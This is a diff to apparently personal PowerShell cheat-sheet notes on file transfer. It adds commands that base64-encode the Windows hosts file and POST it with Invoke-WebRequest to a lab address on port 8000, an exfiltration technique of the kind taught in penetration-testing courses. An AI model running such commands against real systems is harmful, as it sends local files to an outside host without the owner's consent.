@@ -42,7 +42,15 @@ Invoke-WebRequest <Target File URL> -OutFile <Output File Name> -UseBasicParsing
 ```
 ^outfile-invoke-webrequest
 
+```powershell
+$b64 = [System.convert]::ToBase64String((Get-Content -Path 'C:\Windows\System32\drivers\etc\hosts' -Encoding Byte))
+```
+^b64-file-content-variable
 
+```powershell
+Invoke-WebRequest -Uri http://192.168.49.128:8000/ -Method POST -Body $b64
+```
+^post-b64-file-content
 ### Category 2
 
 **Get-ChildItem** is the PowerShell equivalent of dir
